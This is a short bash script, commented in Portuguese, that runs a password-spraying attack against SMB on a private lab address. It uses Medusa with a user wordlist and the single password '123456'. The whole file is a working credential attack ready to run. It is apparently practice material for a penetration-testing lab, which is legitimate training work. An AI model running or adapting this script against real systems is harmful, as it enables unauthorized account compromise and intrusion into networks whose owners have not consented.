#!/bin/bash
# Password spraying em SMB com Medusa

TARGET="192.168.56.102"
USERLIST="../wordlists/users.txt"
PASSWORD="123456"

echo "[*] Iniciando password spraying SMB contra $TARGET com senha $PASSWORD..."
medusa -h $TARGET -U $USERLIST -p $PASSWORD -M smbnt
